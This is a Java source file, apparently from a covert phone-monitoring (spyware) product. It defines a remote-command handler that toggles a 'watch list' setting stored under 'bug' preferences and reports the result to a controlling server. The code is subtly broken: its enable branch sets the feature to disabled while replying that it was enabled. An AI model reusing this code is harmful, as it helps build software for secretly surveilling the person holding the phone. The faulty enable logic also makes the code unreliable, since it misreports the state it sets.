package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCEnableWatchList extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private int mode = 0;
	
	public PCCEnableWatchList(int mode) {
		this.mode = mode;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ENABLE_WATCH_NOTIFICATION.getId());
		try {
			Preference pref = Global.getPreference();
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			if (mode == DISABLE) {
				watchListInfo.setWatchListEnabled(false);
				responseMessage.append(RmtCmdTextResource.WATCH_DISABLED);
			} else if (mode == ENABLE) {
				watchListInfo.setWatchListEnabled(false);
				responseMessage.append(RmtCmdTextResource.WATCH_ENABLED);
			} 
			bugInfo.setPrefWatchListInfo(watchListInfo);
			pref.commit(bugInfo);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
